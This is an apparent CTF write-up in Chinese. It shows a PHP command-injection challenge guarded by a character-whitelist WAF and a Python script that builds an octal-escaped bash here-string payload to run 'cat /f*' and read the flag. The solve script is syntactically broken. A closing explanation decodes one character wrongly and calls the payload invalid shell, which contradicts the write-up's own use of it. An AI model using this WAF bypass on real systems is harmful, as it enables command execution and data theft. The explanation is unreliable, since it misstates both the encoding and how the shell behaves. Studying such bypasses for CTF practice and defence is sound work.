```
<?php

highlight_file(__FILE__);

function waf($cmd){

  $white_list = ['0','1','2','3','4','5','6','7','8','9','\\','\'','$','<']; 

  $cmd_char = str_split($cmd);

  foreach($cmd_char as $char){

​    if (!in_array($char, $white_list)){

​      die("really ez?");

​    }

  }

  return $cmd;

}

$cmd=waf($_GET["cmd"]);

system($cmd);

really ez?
```

脚本：

```python
n = dict() 

n[0] = '0' 

n[1] = '1' 

n[2] = '2' 

n[3] = '3' 

n[4] = '4' 

n[5] = '5' 

n[6] = '6' 

n[7] = '7' //相当于字典

f='' 

def str_to_oct(cmd): #命令转换成八进制字符串 

s = "" 

for t in cmd: 

o = ('%s' % (oct(ord(t))))[2:] //将转换后的前缀0o去掉，例12-->0o14

s+='\\'+o //’\\’是8进制转义的意思

return s 

def build(cmd): #八进制字符串转换成字符 

payload = "$0<<<$0\<\<\<\$\\\'" 

s = str_to_oct(cmd).split('\\') 

for _ in s[1:]: 

payload+="\\\\" 

for i in _: 

payload+=n[int(i)] 

return payload+'\\\'' 

payload="cat /f*" 

print(build(payload))

###  
```

 

在Linux shell中，这个字符串 

$0<<<$0\<\<\<\$\'\\143\\141\\164\\40\\57\\146\\52\' 包含了多种元素，其中一些可能是转义序列，而另一些可能是字面量字符。让我们一步步地分析它：

\1. $0：在shell脚本中，这通常代表脚本自己的名字。

\2. <<<：这是Bash中的here string操作符，它用于将紧随其后的字符串作为输入传递给一个命令。然而，在您的字符串中，<<<后面并没有跟着命令，所以这可能是无效的。

\3. \<：这不是一个标准的转义序列。在正则表达式中，\ 用于转义特殊字符，但在shell中，通常不需要转义<。

\4. $\：$ 是变量前缀，而 \ 通常用作转义字符。但 $\ 这样的组合通常不是有效的shell语法。

\5. \'\\143\\141\\164\\40\\57\\146\\52\'：这里的 \' 开始了一个单引号字符串，然后 \\ 开始了一系列的八进制转义序列。 

\1. \\143 转换为八进制数143，对应的ASCII字符是 'c'

\2. \\141 转换为八进制数141，对应的ASCII字符是 'a'

\3. \\164 转换为八进制数164，对应的ASCII字符是 't'

\4. \\40 转换为八进制数40，对应的ASCII字符是 ' ' (空格)

\5. \\57 转换为八进制数57，对应的ASCII字符是 '/'

\6. \\146 转换为八进制数146，对应的ASCII字符是 'f'

\7. \\52 转换为八进制数52，对应的ASCII字符是 '+'

所以，整个字符串 $0<<<$0\<\<\<\$\'\\143\\141\\164\\40\\57\\146\\52\' 在shell中解析后，如果 $0 被替换为脚本名（例如 script.sh），那么该字符串会变为类似 script.sh<<<script.sh\<\<\<$\'cat /f+\' 的形式。但请注意，这仍然不是一个有效的shell命令，因为 <<< 后面没有跟随有效的命令，并且 \< 和 $\ 也不是有效的shell语法。

为什么这样做取决于原始意图。如果这是从某个脚本或配置文件中摘录出来的，可能是为了某种特定的目的（例如，混淆、编码或尝试执行某些操作）。然而，从语法上看，它并不是一个有效的shell命令或表达式。如果您尝试在shell中执行它，您可能会遇到错误。

 